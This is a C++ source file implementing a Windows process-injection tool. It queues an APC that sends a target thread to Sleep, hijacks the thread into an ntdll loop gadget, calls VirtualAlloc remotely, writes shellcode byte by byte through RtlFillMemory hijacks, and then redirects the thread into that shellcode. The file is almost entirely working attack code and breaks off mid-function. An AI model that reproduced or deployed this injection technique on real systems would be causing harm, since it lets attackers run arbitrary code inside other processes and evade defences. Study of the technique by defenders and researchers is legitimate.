#include "ApcInjection.h"

bool ExecuteRemoteFunctionViaAPCHijack(
    HANDLE hProcess,
    const InjectionConfig &config,
    LPVOID pfnTargetFunction,
    DWORD64 arg1, DWORD64 arg2, DWORD64 arg3, DWORD64 arg4,
    LPVOID pSleep,
    LPVOID loopGadgetAddr)
{
    // --- Configuration ---
    const DWORD APCSleepDurationMs = 200; // How long the APC makes the thread sleep
    const int WaitAfterHijack1Ms = 50;    // Time to wait after 1st hijack (for Sleep to finish)
    const int LoopCheckTimeoutMs = 2000;  // Max time to wait for thread to hit loop gadget
    const int LoopCheckIntervalMs = 50;   // How often to check if thread is looping
    const int SleepWaitTimeoutMs = 3000;  // Max time to wait for thread to enter sleep state
    const int WakeWaitTimeoutMs = 3000;   // Max time to wait for thread to exit sleep state

    if (config.verbose)
    {
        std::cout << "  [Hijack Primitive] Executing function at " << pfnTargetFunction << " via APC+Hijack on TID " << config.targetTid << std::endl;
        std::cout << "  [Hijack Primitive] Args: RCX=" << arg1 << " RDX=" << arg2 << " R8=" << arg3 << " R9=" << arg4 << std::endl;
    }

    if (!pSleep || !loopGadgetAddr)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: Sleep or Loop Gadget address not initialized!" << std::endl;
        return false;
    }
    if (config.targetTid == 0)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: Target TID is zero!" << std::endl;
        return false;
    }

    // --- Open Target Thread ---
    // Permissions needed: SET_CONTEXT, QUERY_INFORMATION, GET_CONTEXT, SUSPEND_RESUME (if used)
    DWORD dwThreadDesiredAccess = THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION | THREAD_GET_CONTEXT;
    if (config.useSuspend)
    {
        dwThreadDesiredAccess |= THREAD_SUSPEND_RESUME;
    }
    HANDLE hThread = OpenThread(dwThreadDesiredAccess, FALSE, config.targetTid);
    if (!hThread)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: OpenThread failed for TID " << config.targetTid << ". Error: " << GetLastError() << std::endl;
        return false;
    }
    if (config.verbose)
        std::cout << "  [Hijack Primitive] Opened target thread handle.\n";

    // --- Stage 1: Queue APC to Sleep ---
    if (config.verbose)
        std::cout << "  [Hijack Primitive] Stage 1: Queueing APC to Sleep(" << APCSleepDurationMs << ")\n";

    // Use standard QueueUserAPC
    DWORD queueResult = QueueUserAPC(
        (PAPCFUNC)pSleep,             // APC routine is Sleep
        hThread,                      // Target thread
        (ULONG_PTR)APCSleepDurationMs // Argument for Sleep
    );

    if (queueResult == 0)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: QueueUserAPC failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hThread);
        return false;
    }

    // Sleep(WaitAfterAPCMs); // Unreliable wait
    //  --- Wait for Thread to Enter Sleep State --- NEW ---
    if (!WaitForThreadToSleep(config.targetTid, SleepWaitTimeoutMs, config.verbose))
    {
        // Error message already printed by WaitForThreadToSleep
        CloseHandle(hThread);
        return false;
    }

    // std::cin.get();  // manual steps
    //  --- Stage 1.5: Hijack During Sleep -> Infinite Loop ---
    if (config.verbose)
        std::cout << "  [Hijack Primitive] Stage 1.5: Hijacking Sleep -> Loop\n";

    bool suspended1 = false;
    if (config.useSuspend)
    {
        if (SuspendThread(hThread) != (DWORD)-1)
        {
            suspended1 = true;
            if (config.verbose)
                std::cout << "    [Suspend] Thread suspended.\n";
        }
        else
        {
            std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: SuspendThread (1) failed. Error: " << GetLastError() << std::endl;
            // Continue without suspend? Or fail? Let's try continuing but log warning.
        }
    }

    CONTEXT ctx1 = {0};
    ctx1.ContextFlags = CONTEXT_CONTROL; // Only need RIP
    if (!GetThreadContext(hThread, &ctx1))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: GetThreadContext (1) failed. Error: " << GetLastError() << std::endl;
        if (suspended1)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }
    if (config.verbose)
        std::cout << "    [Context] Current RIP (in Sleep?): 0x" << std::hex << ctx1.Rip << std::dec << "\n";

    // Modify RIP to point to the loop gadget
    ctx1.Rip = (DWORD64)loopGadgetAddr;
    if (config.verbose)
        std::cout << "    [Context] Setting RIP to Loop Gadget: 0x" << std::hex << ctx1.Rip << std::dec << "\n";

    if (!SetThreadContext(hThread, &ctx1))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: SetThreadContext (1) failed. Error: " << GetLastError() << std::endl;
        if (suspended1)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }
    if (config.verbose)
        std::cout << "    [Context] SetThreadContext (1) successful.\n";

    if (suspended1)
    {
        if (ResumeThread(hThread) == (DWORD)-1)
        {
            std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: ResumeThread (1) failed. Error: " << GetLastError() << std::endl;
            // If resume fails after setting context, the thread might be stuck suspended. Critical error.
            CloseHandle(hThread);
            return false;
        }
        else
        {
            if (config.verbose)
                std::cout << "    [Suspend] Thread resumed.\n";
        }
    }

    if (config.verbose)
        std::cout << "  [Hijack Primitive] Thread should finish Sleep, then hit loop. Waiting (" << WaitAfterHijack1Ms << "ms)...\n";
    Sleep(WaitAfterHijack1Ms);
    // std::cin.get();  // manual steps

    // --- Verification Step A: Wait for Thread to Finish Sleeping --- NEW ---
    if (!WaitForThreadToRunOrReady(config.targetTid, WakeWaitTimeoutMs, config.verbose))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: Thread did not exit Waiting state after hijack 1." << std::endl;
        CloseHandle(hThread);
        return false;
    }
    // --- At this point, the thread should have finished its kernel delay ---
    // Optional: Add a very small delay here if needed for context switch stabilization
    ::Sleep(10);

    // --- Verification (Old, maybe can remove): Check if Thread is Spinning ---
    if (config.verbose)
        std::cout << "  [Hijack Primitive] Verifying thread is at loop gadget (Timeout: " << LoopCheckTimeoutMs << "ms)...\n";
    bool loopConfirmed = false;
    auto startTime = std::chrono::steady_clock::now();
    CONTEXT ctx_check = {0};
    ctx_check.ContextFlags = CONTEXT_CONTROL; // Only need RIP

    while (std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - startTime).count() < LoopCheckTimeoutMs)
    {
        // Don't suspend/resume here for checking, just get context if possible
        if (GetThreadContext(hThread, &ctx_check))
        {
            if (ctx_check.Rip == (DWORD64)loopGadgetAddr)
            {
                loopConfirmed = true;
                // This case should be less common now after WaitForThreadToRunOrReady, but possible during context switch
                if (config.verbose)
                    std::cout << "    [Verify] Loop confirmed at RIP: 0x" << std::hex << ctx_check.Rip << std::dec << "\n";
                break;
            }
        }
        else
        {
            // GetThreadContext failing might mean thread terminated or other issue
            DWORD error = GetLastError();
            if (error == ERROR_ACCESS_DENIED && config.verbose)
            { /* Expected sometimes */
            }
            else
            {
                std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: GetThreadContext (check loop) failed. Error: " << error << std::endl;
            }
            // Optionally break or continue based on error
        }
        Sleep(LoopCheckIntervalMs);
    }

    if (!loopConfirmed)
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: Timed out waiting for thread to hit loop gadget (RIP=0x" << std::hex << ctx_check.Rip << std::dec << "). Aborting.\n";
        CloseHandle(hThread);
        return false;
    }

    // --- Stage 2: Hijack the Spinning Thread -> Target Function ---
    if (config.verbose)
        std::cout << "  [Hijack Primitive] Stage 2: Hijacking Loop -> Target Function (" << pfnTargetFunction << ")\n";

    bool suspended2 = false;
    if (config.useSuspend)
    {
        if (SuspendThread(hThread) != (DWORD)-1)
        {
            suspended2 = true;
            if (config.verbose)
                std::cout << "    [Suspend] Thread suspended.\n";
        }
        else
        {
            std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: SuspendThread (2) failed. Error: " << GetLastError() << std::endl;
        }
    }

    CONTEXT ctx2 = {0};
    // Need CONTROL (RIP) and INTEGER (RCX, RDX, R8, R9)
    ctx2.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    if (!GetThreadContext(hThread, &ctx2))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: GetThreadContext (2) failed. Error: " << GetLastError() << std::endl;
        if (suspended2)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    // Verify RIP is *still* at the loop gadget just before setting context
    if (ctx2.Rip != (DWORD64)loopGadgetAddr)
    {
        std::cerr << "[!] CRITICAL WARNING: Thread RIP 0x" << std::hex << ctx2.Rip << " changed before final hijack! Expected 0x" << loopGadgetAddr << std::dec << ". Aborting.\n";
        if (suspended2)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }
    if (config.verbose)
        std::cout << "    [Context] Confirmed RIP at loop gadget: 0x" << std::hex << ctx2.Rip << std::dec << "\n";

    // Setup target function call
    ctx2.Rip = (DWORD64)pfnTargetFunction;
    ctx2.Rcx = arg1;
    ctx2.Rdx = arg2;
    ctx2.R8 = arg3;
    ctx2.R9 = arg4;
    // RSP should remain valid from the spinning state

    if (config.verbose)
    {
        std::cout << "    [Context] Setting Context for Target Function call:\n";
        std::cout << "      RIP = 0x" << std::hex << ctx2.Rip << "\n";
        std::cout << "      RCX = 0x" << ctx2.Rcx << "\n";
        std::cout << "      RDX = 0x" << ctx2.Rdx << "\n";
        std::cout << "      R8  = 0x" << ctx2.R8 << "\n";
        std::cout << "      R9  = 0x" << ctx2.R9 << std::dec << "\n";
    }

    if (!SetThreadContext(hThread, &ctx2))
    {
        std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: SetThreadContext (2) failed. Error: " << GetLastError() << std::endl;
        if (suspended2)
            ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }
    if (config.verbose)
        std::cout << "    [Context] SetThreadContext (2) successful.\n";

    if (suspended2)
    {
        if (ResumeThread(hThread) == (DWORD)-1)
        {
            std::cerr << "[!] ExecuteRemoteFunctionViaAPCHijack: ResumeThread (2) failed. Error: " << GetLastError() << std::endl;
            // Critical failure
            CloseHandle(hThread);
            return false;
        }
        else
        {
            if (config.verbose)
                std::cout << "    [Suspend] Thread resumed. Should execute target function.\n";
        }
    }
    else
    {
        if (config.verbose)
            std::cout << "  [Hijack Primitive] Thread not suspended. Should execute target function.\n";
    }

    // --- Cleanup ---
    CloseHandle(hThread);
    if (config.verbose)
        std::cout << "  [Hijack Primitive] Hijack sequence complete. Thread handle closed.\n";

    // Note: Success here means the hijack sequence was completed.
    // The target function's execution and return are asynchronous.
    return true;
}

// Helper function to use ROP gadget for shellcode injection (Definition moved below Inject)
bool InjectShellcodeUsingAPC(
    HANDLE hProcess,
    const std::vector<unsigned char> &shellcodeBytes,
    const InjectionConfig &config)
{
    if (config.contextMethod != ContextMethod::TWO_STEP)
    {
        std::cerr << "[!] InjectShellcodeUsingAPC currently only supports '--context-method two-step'." << std::endl;
        // Optionally fall back to a simpler method or just fail.
        // For now, we fail if the context isn't two-step.
        // We could implement the direct QueueUserAPC(shellcode) here under a different context method if needed.
        return false;
    }

    if (config.targetTid == 0)
    {
        std::cerr << "[!] QueueUserAPC (two-step) method requires a target thread ID (--tid)." << std::endl;
        return false;
    }

    if (shellcodeBytes.empty())
    {
        std::cerr << "[!] No shellcode provided to inject." << std::endl;
        return false;
    }

    // Get necessary function addresses
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32)
    {
        std::cerr << "[!] Failed to get kernel32.dll handle. Error: " << GetLastError() << std::endl;
        return false;
    }

    LPVOID pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
    LPVOID pRtlMoveMemory = GetProcAddress(hKernel32, "RtlMoveMemory");
    LPVOID pRtlFillMemory = GetProcAddress(hKernel32, "RtlFillMemory");
    // LPVOID pRtlFillMemory = ::pRtlFillMemory; // Use the global pointer
    LPVOID pSleep = GetProcAddress(hKernel32, "Sleep");
    LPVOID loopGadgetAddr = nullptr;

    std::cout << "[*] Searching for local loop gadget (EB FE) in ntdll.dll..." << std::endl;
    std::vector<BYTE> loopGadgetBytes = {0xEB, 0xFE}; // jmp short -2
    loopGadgetAddr = FindLocalGadgetInRX("ntdll.dll", loopGadgetBytes, config.verbose);

    if (config.verbose)
    {
        std::cout << "[*] Using two-step APC hijack context method." << std::endl;
        std::cout << "[*] Target TID: " << config.targetTid << std::endl;
        std::cout << "[*] Required addresses:"
                  << "\n    VirtualAlloc: " << pVirtualAlloc
                  << "\n    RtlMoveMemory: " << pRtlMoveMemory
                  << "\n    RtlFillMemory: " << pRtlFillMemory
                  << "\n    Sleep: " << pSleep
                  << "\n    Loop Gadget: " << loopGadgetAddr << std::endl;
    }
    if (!pVirtualAlloc || !pRtlFillMemory || !pSleep || !loopGadgetAddr)
    {
        std::cerr << "[!] Failed to get necessary function addresses. Error: " << GetLastError() << std::endl;
        return false;
    }

    // --- Injection Steps ---

    // 1. Allocate memory in the target process for the shellcode
    DWORD64 ALLOC_SIZE = config.allocSize;
    DWORD64 ALLOC_TYPE = MEM_COMMIT | MEM_RESERVE;
    DWORD64 ALLOC_PROTECT = config.allocPerm;
    DWORD64 REQUESTED_ALLOC_ADDR = config.allocAddress ? config.allocAddress : 0x60000;
    LPVOID pRemoteMemory = (LPVOID)REQUESTED_ALLOC_ADDR;

    if (config.verbose)
    {
        std::cout << "\n[*] --- Step 1: Allocating Memory ---" << std::endl;
        std::cout << "[*] Attempting to call VirtualAlloc via APC+Hijack" << std::endl;
        std::cout << "[*] Requested Address: " << pRemoteMemory << " (Assumed)" << std::endl;
        std::cout << "[*] Size: " << ALLOC_SIZE << " bytes" << std::endl;
        std::cout << "[*] Permissions: 0x" << std::hex << ALLOC_PROTECT << std::dec << std::endl;
    }

    bool allocSuccess = ExecuteRemoteFunctionViaAPCHijack(
        hProcess,
        config,
        pVirtualAlloc,
        REQUESTED_ALLOC_ADDR, // RCX: lpAddress (REQUESTED)
        ALLOC_SIZE,           // RDX: dwSize
        ALLOC_TYPE,           // R8:  flAllocationType
        ALLOC_PROTECT,        // R9:  flProtect
        pSleep,               // Sleep function address
        loopGadgetAddr        // Loop Gadget address
    );

    if (!allocSuccess)
    {
        std::cerr << "[!] Failed to execute VirtualAlloc call via APC+Hijack." << std::endl;
        // No memory to free here as we don't know if it was allocated
        return false;
    }

    // We *assume* allocation succeeded at pRemoteMemory. A check could involve
    // trying to ReadProcessMemory from pRemoteMemory, but even that isn't foolproof.
    if (config.verbose)
    {
        std::cout << "[+] VirtualAlloc call executed via hijack (Assumed success at " << pRemoteMemory << ")." << std::endl;
    }

    if (config.verbose)
    {
        std::cout << "\n[*] --- Step 2: Writing Shellcode (Byte-by-Byte via Hijack) ---" << std::endl;
        std::cout << "[*] This step will be very slow. Please be patient." << std::endl;
    }

    // --- DEBUG PAUSE 1 ---
    if (config.enterDebug)
    {
        std::cout << "\n  [DEBUG] InjectShellcodeUsingAPC: Post-Allocation" << std::endl;
        std::cout << "    Target PID: " << config.targetPid << ", TID: " << config.targetTid << std::endl;
        std::cout << "    Assumed allocated memory (pRemoteMemory): 0x" << std::hex << pRemoteMemory << std::dec << std::endl;
        std::cout << "    Size: " << ALLOC_SIZE << " bytes, Permissions: 0x" << std::hex << ALLOC_PROTECT << std::dec << std::endl;
        std::cout << "  [ACTION] Press ENTER to proceed to write shellcode..." << std::endl;
        // std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n'); // Already cleared if needed
        std::cin.get();
    }
    // --- END DEBUG PAUSE 1 ---

    // 2. Write Shellcode using PerformRemoteMemoryCopyViaAPCHijack
    bool copySuccess = PerformRemoteMemoryCopyViaAPCHijack(
        hProcess,
        config,
        pRtlFillMemory,        // Pass RtlMoveMemory address
        pRemoteMemory,         // Destination base address
        shellcodeBytes.data(), // Source shellcode buffer
        shellcodeBytes.size(), // Source shellcode size
        pSleep,                // Pass Sleep address
        loopGadgetAddr         // Pass Gadget address
    );

    if (!copySuccess)
    {
        std::cerr << "[!] Failed during byte-by-byte shellcode copy via APC+Hijack." << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE); // Attempt cleanup
        return false;
    }
    if (config.verbose)
    {
        std::cout << "[+] Shellcode copy via hijack completed." << std::endl;
    }

    // 3. Execute Shellcode using the Hijack Primitive
    if (config.verbose)
    {
        std::cout << "\n[*] --- Step 3: Executing Shellcode (Direct Jump via Hijack) ---" << std::endl;
        std::cout << "[*] Attempting to jump to shellcode at " << pRemoteMemory << " via APC+Hijack" << std::endl;
    }

    // --- DEBUG PAUSE 3 (Pre-Execution) --- // ADDED THIS PAUSE
    if (config.enterDebug)
    {
        std::cout << "\n  [DEBUG] InjectShellcodeUsingAPC: Pre-Execution" << std::endl;
        std::cout << "    About to hijack to shellcode at 0x" << std::hex << pRemoteMemory << std::dec << std::endl;
        std::cout << "  [ACTION] Press ENTER to trigger shellcode execution..." << std::endl;
        std::cin.get();
    }
    // --- END DEBUG PAUSE 3 ---

    // Hijack directly into the shellcode address, we could add more triggers here like callback registrations etc,
    // if we want to free the thread executing the apc without relying on the shellcode.
    bool execSuccess = ExecuteRemoteFunctionViaAPCHijack(
        hProcess, config,
        pRemoteMemory, // Target function is the shellcode itself
        0, 0, 0, 0,    // Args (usually none needed for shellcode entry)
        pSleep,        // Pass Sleep pointer
        loopGadgetAddr // Pass Gadget pointer
    );

    if (!execSuccess)
    {
        std::cerr << "[!] Failed to execute shellcode call via APC+Hijack." << std::endl;
        // Don't free here, shellcode might be partially running or needed
        // VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE); // Maybe attempt cleanup? Risky.
        return false;
    }
    if (config.verbose)
    {
        std::cout << "[+] Shellcode execution triggered via hijack." << std::endl;
    }

    return true; // Success means all steps initiated
}

// --- Byte-by-Byte Memory Copy via APC Hijack ---
bool PerformRemoteMemoryCopyViaAPCHijack(
    HANDLE hProcess,
    const InjectionConfig &config,
    LPVOID pRtlFillMemory,
    LPVOID pRemoteDestBase,
    const unsigned char *sourceData,
    size_t dataSize,
    LPVOID pSleep,
    LPVOID loopGadgetAddr)
{
    if (!pRtlFillMemory || !pRemoteDestBase || !sourceData || !pSleep || !loopGadgetAddr)
    {
        std::cerr << "[!] PerformRemoteMemoryCopyViaAPCHijack: Invalid arguments provided." << std::endl;
        return false;
    }

    if (config.verbose)
    {
        std::cout << "  [Copy Primitive] Starting byte-by-byte copy of " << dataSize << " bytes to " << pRemoteDestBase << " using APC+Hijack(RtlMoveMemory)..." << std::endl;
        std::cout << "  [Copy Primitive] WARNING: This process will be slow!" << std::endl;
    }

    for (size_t i = 0; i < dataSize; ++i)
    {
        char targetChar = static_cast<char>(sourceData[i]);
        BYTE byteToWrite = sourceData[i]; // Get the byte value directly from the source buffer for memset/RtlFillMemory
        // LPVOID remoteByteAddress = FindCharInRemoteProcess(hProcess, targetChar);  // Find the byte in the target process's memory for memcpy/RtlMoveMemory
        // if (remoteByteAddress == nullptr) {
        //     // This is a significant problem. We can't find the byte needed.
        //     // Option 1: Skip the byte (leaves garbage).
        //     // Option 2: Fail entirely.
        //     std::cerr << "[!] PerformRemoteMemoryCopyViaAPCHijack: Failed to find byte value 0x"
        //         << std::hex << static_cast<int>(targetChar) << std::dec
        //         << " (at index " << i << ") in remote process memory. Cannot copy." << std::endl;
        //     if (config.verbose && i > 0) { // Log progress if some bytes were copied
        //         std::cout << "  [Copy Primitive] Copied " << i << " bytes before failure." << std::endl;
        //     }
        //     return false; // Fail completely is safer
        // }

        // Log progress
        if (config.verbose)
        {
            std::cout << "  [Copy Primitive] Copying byte " << i + 1 << "/" << dataSize << " (Value: 0x" << std::hex << static_cast<int>(targetChar) << std::dec << ")" << std::endl;
        }
        else if (i % 10 == 0)
        {
            std::cout << "  [Copy Primitive] Copying byte " << i + 1 << "/" << dataSize << " (Value: 0x" << std::hex << static_cast<int>(targetChar) << std::dec << ")" << std::endl;
        }

        // Use the APC hijack primitive to call RtlMoveMemory(destination + i, remoteByteAddress, 1)
        // Cast pRemoteDestBase to BYTE* for pointer arithmetic
        DWORD64 destinationAddressByte = reinterpret_cast<DWORD64>(
            static_cast<BYTE *>(pRemoteDestBase) + i);

        // bool hijackSuccess = ExecuteRemoteFunctionViaAPCHijack(
        //     hProcess,
        //     config,
        //     pRtlMoveMemory,                 // Target function
        //     destinationAddressByte,         // Arg1 (RCX): Destination address for this byte
        //     (DWORD64)remoteByteAddress,     // Arg2 (RDX): Source address (where the byte was found)
        //     1,                              // Arg3 (R8): Length (1 byte)
        //     0,                              // Arg4 (R9): Unused
        //     pSleep,                         // Pass Sleep pointer
        //     loopGadgetAddr                  // Pass Gadget pointer
        //);

        // Use the APC hijack primitive to call RtlFillMemory(Destination, Length=1, Fill=byteToWrite)
        // Arguments for RtlFillMemory: (PVOID Destination, SIZE_T Length, BYTE Fill)
        // Map to Hijack Args:          (RCX,             RDX,          R8)
        bool hijackSuccess = ExecuteRemoteFunctionViaAPCHijack(
            hProcess,
            config,
            pRtlFillMemory,         // Target function = RtlFillMemory
            destinationAddressByte, // Arg1 (RCX): Destination address for this byte
            1,                      // Arg2 (RDX): Length (1 byte)
            (DWORD64)byteToWrite,   // Arg3 (R8): Fill byte value
            0,                      // Arg4 (R9): Unused
            pSleep,
            loopGadgetAddr);

        if (!hijackSuccess)
        {
            std::cerr << "[!] PerformRemoteMemoryCopyViaAPCHijack: Hijack sequence failed for byte " << i << "." << std::endl;
            if (config.verbose && i > 0)
            {
                std::cout << "  [Copy Primitive] Copied " << i << " bytes before failure." << std::endl;
            }
            // If the hijack itself fails, something is wrong with the target thread state or permissions.
            return false; // Abort on hijack failure
        }
        // Optional: Short delay between hijacks if needed, though unlikely necessary
        // std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }

    if (config.verbose)
    {
        std::cout << "  [Copy Primitive] Successfully completed " << dataSize << " byte-by-byte copy hijacks." << std::endl;
    }

    return true; // Return true if the loop completes (all hijacks initiated)
}

// --- Helper to get Thread State and Wait Reason ---
// Returns true on success, filling outState and outWaitReason.
// Returns false if thread not found or API fails.
bool GetThreadStateAndWaitReason(DWORD targetTid, KTHREAD_STATE &outState, KWAIT_REASON &outWaitReason, bool verbose)
{
    if (!pNtQuerySystemInformation)
        return false;

    NTSTATUS status;
    ULONG bufferSize = 0;
    PVOID buffer = nullptr;

    // Query required buffer size
    status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemProcessInformation, nullptr, 0, &bufferSize);
    if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
        if (verbose)
            std::cerr << "  [Get State] NtQuerySystemInformation (size query) failed: 0x" << std::hex << status << std::dec << std::endl;
        return false;
    }

    // Allocate buffer (add some padding)
    bufferSize += 1024 * 16; // Add 16KB padding
    buffer = VirtualAlloc(nullptr, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer)
    {
        if (verbose)
            std::cerr << "  [Get State] Failed to allocate buffer for system information." << std::endl;
        return false;
    }

    // Query actual information
    status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemProcessInformation, buffer, bufferSize, &bufferSize);
    if (status != STATUS_SUCCESS)
    {
        if (verbose)
            std::cerr << "  [Get State] NtQuerySystemInformation failed: 0x" << std::hex << status << std::dec << std::endl;
        VirtualFree(buffer, 0, MEM_RELEASE);
        return false;
    }

    // Iterate through processes and threads using official PSYSTEM_PROCESS_INFO
    PSYSTEM_PROCESS_INFO pCurrentProcess = (PSYSTEM_PROCESS_INFO)buffer;
    while (true)
    {
        // Use official PSYSTEM_THREAD_INFORMATION
        // Correctly calculate pointer to first thread structure
        PSYSTEM_THREAD_INFORMATION pThreadInfo = pCurrentProcess->Threads;

        for (ULONG i = 0; i < pCurrentProcess->NumberOfThreads; ++i)
        {
            // Basic bounds check
            if ((BYTE *)pThreadInfo >= ((BYTE *)buffer + bufferSize))
            {
                if (verbose)
                    std::cerr << "  [Get State] Buffer overrun detected while parsing threads." << std::endl;
                goto cleanup_and_fail; // Use goto for cleanup on inner loop failure
            }

            // Access members using the official structure pointer type
            if (pThreadInfo->ClientId.UniqueThread == (HANDLE)(DWORD_PTR)targetTid)
            {
                outState = (KTHREAD_STATE)pThreadInfo->ThreadState;    // Cast enum if necessary
                outWaitReason = (KWAIT_REASON)pThreadInfo->WaitReason; // Cast enum if necessary
                if (verbose)
                {
                    std::cout << "    [Get State] Found TID " << targetTid << ": State=" << outState << ", WaitReason=" << outWaitReason << std::endl;
                }
                VirtualFree(buffer, 0, MEM_RELEASE);
                return true; // Found it!
            }

            // Advance pointer - ASSUMING fixed size, this is fragile.
            pThreadInfo++;

        } // End thread loop

        // Move to the next process entry
        if (pCurrentProcess->NextEntryOffset == 0)
        {
            break; // End of list
        }
        // Basic bounds check before advancing process pointer
        if (((BYTE *)pCurrentProcess + pCurrentProcess->NextEntryOffset) >= ((BYTE *)buffer + bufferSize) ||
            ((BYTE *)pCurrentProcess + pCurrentProcess->NextEntryOffset) <= (BYTE *)pCurrentProcess) // Sanity check offset
        {
            if (verbose)
                std::cerr << "  [Get State] Invalid NextEntryOffset detected." << std::endl;
            break;
        }
        pCurrentProcess = (PSYSTEM_PROCESS_INFO)((BYTE *)pCurrentProcess + pCurrentProcess->NextEntryOffset);

        // Basic check: ensure next process start isn't outside buffer
        if ((BYTE *)pCurrentProcess >= ((BYTE *)buffer + bufferSize))
        {
            if (verbose)
                std::cerr << "  [Get State] Buffer overrun detected while parsing processes." << std::endl;
            break;
        }

    } // End process loop

cleanup_and_fail: // Label for cleanup before returning false
    // Thread not found
    if (verbose)
        std::cerr << "  [Get State] Target TID " << targetTid << " not found in system process list." << std::endl;
    VirtualFree(buffer, 0, MEM_RELEASE);
    return false;
}

// --- IsThreadSleeping using State Check ---
bool IsThreadSleeping(DWORD targetTid, bool verbose)
{
    KTHREAD_STATE state;
    KWAIT_REASON waitReason;

    if (GetThreadStateAndWaitReason(targetTid, state, waitReason, verbose))
    {
        // Check if the thread is in a waiting state AND the reason is DelayExecution
        if (state == Waiting && (waitReason == DelayExecution || waitReason == WrDelayExecution))
        {
            return true;
        }
        // Optional: Log other waiting states if verbose
        else if (verbose && state == Waiting)
        {
            std::cout << "    [Check Sleep] Thread is Waiting, but Reason=" << waitReason << " (Not DelayExecution)" << std::endl;
        }
    }
    // Return false if thread not found, query failed, or state/reason don't match
    return false;
}

// --- WaitForThreadToSleep using State Check ---
bool WaitForThreadToSleep(DWORD targetTid, int timeoutMs, bool verbose)
{
    if (verbose)
        std::cout << "  [Wait Sleep] Waiting up to " << timeoutMs << "ms for thread " << targetTid << " state=Waiting, reason=DelayExecution..." << std::endl;

    auto startTime = std::chrono::steady_clock::now();
    const int checkIntervalMs = 50;

    while (std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - startTime).count() < timeoutMs)
    {
        // Call the *new* IsThreadSleeping which uses GetThreadStateAndWaitReason
        if (IsThreadSleeping(targetTid, verbose))
        {
            if (verbose)
                std::cout << "  [Wait Sleep] Detected thread in DelayExecution state." << std::endl;
            return true;
        }
        ::Sleep(checkIntervalMs);
    }

    std::cerr << "[!] WaitForThreadToSleep: Timed out waiting for thread " << targetTid << " to enter DelayExecution state." << std::endl;
    return false;
}

// --- Wait Function for Running/Ready State ---
// Waits for the target thread to exit the Waiting state.
// Returns true if state changes within timeout, false otherwise.
bool WaitForThreadToRunOrReady(DWORD targetTid, int timeoutMs, bool verbose)
{
    if (verbose)
        std::cout << "  [Wait Run/Ready] Waiting up to " << timeoutMs << "ms for thread " << targetTid << " to exit Waiting state..." << std::endl;

    auto startTime = std::chrono::steady_clock::now();
    const int checkIntervalMs = 20; // Check more frequently here
    KTHREAD_STATE state;
    KWAIT_REASON waitReason; // We don't check reason here, just state

    while (std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - startTime).count() < timeoutMs)
    {
        if (GetThreadStateAndWaitReason(targetTid, state, waitReason, false)) // Don't need verbose logging inside loop
        {
            if (state != Waiting)
            { // Check if NOT waiting anymore
                if (verbose)
                    std::cout << "  [Wait Run/Ready] Thread state changed to " << state << ". (No longer Waiting)" << std::endl;
                return true;
            }
            // If verbose, maybe log that it's still waiting periodically
            // else if (verbose && (std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - startTime).count() % 500 < checkIntervalMs)) {
            //      std::cout << "    [Wait Run/Ready] Thread still Waiting (Reason: " << waitReason << ")" << std::endl;
            // }
        }
        else
        {
            // GetThreadStateAndWaitReason failed - could be transient or thread died
            if (verbose)
                std::cerr << "  [Wait Run/Ready] GetThreadStateAndWaitReason failed during wait." << std::endl;
            // Optionally break or add error tolerance
        }
        ::Sleep(checkIntervalMs);
    }

    std::cerr << "[!] WaitForThreadToRunOrReady: Timed out waiting for thread " << targetTid << " to exit Waiting state." << std::endl;
    return false;
}
// Injection.cpp
// ... includes ...
// ... other helpers (GetThreadStateAndWaitReason) ...

// --- Helper to Check if Thread is Likely Alertable ---
// Checks if the thread is in a state conducive to processing user-mode APCs.
// Returns true if likely alertable, false otherwise or on error.
bool IsThreadAlertable(DWORD targetTid, bool verbose)
{
    KTHREAD_STATE state;
    KWAIT_REASON waitReason;

    if (GetThreadStateAndWaitReason(targetTid, state, waitReason, verbose))
    {
        // Condition 1: Thread is Waiting for a UserRequest (common for alertable waits)
        if (state == Waiting && waitReason == UserRequest)
        {
            if (verbose)
                std::cout << "    [Check Alertable] Thread State=Waiting, Reason=UserRequest. Likely alertable." << std::endl;
            return true;
        }
        // Condition 2: Thread is Running (will process APC on next alertable wait or syscall return)
        // This is less certain, but worth considering. Forcing requires an alertable wait.
        if (state == Running)
        {
            if (verbose)
